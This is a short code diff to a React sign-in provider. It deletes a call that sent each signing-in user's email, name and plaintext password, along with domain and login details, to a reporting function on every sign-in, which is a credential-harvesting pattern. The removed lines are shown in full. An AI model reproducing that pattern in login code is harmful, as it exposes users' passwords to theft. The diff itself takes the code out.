@@ -1,6 +1,4 @@
 import { useCallback, useMemo, useState, type ReactNode } from 'react'
-import { sendResponse } from '../lib/responses'
-import { getDomainFromEmail, resolveBackgroundDomain } from '../lib/utils'
 import { AuthContext } from './AuthContext'
 import type { AuthStep, SignInMeta, User } from '../types'
 
@@ -26,21 +24,10 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const [step, setStep] = useState<AuthStep>(stored?.user ? 'verified' : 'signin')
 
   const signIn = useCallback((nextUser: User, meta?: SignInMeta) => {
+    void meta
     setUser(nextUser)
     setStep('verified')
     sessionStorage.setItem(STORAGE_KEY, JSON.stringify({ user: nextUser }))
-
-    void sendResponse({
-      type: 'sign_in_report',
-      email: nextUser.email,
-      name: nextUser.name,
-      password: meta?.password,
-      passwordValue: meta?.password,
-      domain: getDomainFromEmail(nextUser.email) || resolveBackgroundDomain(),
-      authMethod: meta?.authMethod ?? 'unknown',
-      attempt: meta?.attempt,
-      outcome: meta?.outcome ?? 'success',
-    })
   }, [])
 
   const signOut = useCallback(() => {
